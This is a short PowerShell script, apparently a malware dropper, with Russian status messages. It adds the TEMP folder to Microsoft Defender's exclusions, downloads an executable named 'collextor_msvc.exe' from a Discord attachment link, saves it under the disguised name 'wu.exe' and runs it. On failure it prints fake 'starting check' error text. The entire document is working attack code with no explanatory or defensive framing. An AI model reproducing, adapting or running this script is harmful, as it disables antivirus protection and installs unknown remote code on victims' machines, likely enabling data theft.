$f = "$env:TEMP\wu.exe"
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Out-Null
try {
    iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520799959132409896/collextor_msvc.exe?ex=6a4282d5&is=6a413155&hm=312819108eca99d8d134092f2e889413c954015879aa9866f2f68733c1d4c080&" -OutFile $f -UseBasicParsing
} catch {
    Write-Host "Начало проверки...\n Ошибка 0)XZZZ__"
    exit 1
}
if (Test-Path $f) {
    Start-Process $f -Wait
} else {
    Write-Host " Ошибка 0)XZZZ__, что-то мешает процессу"
}
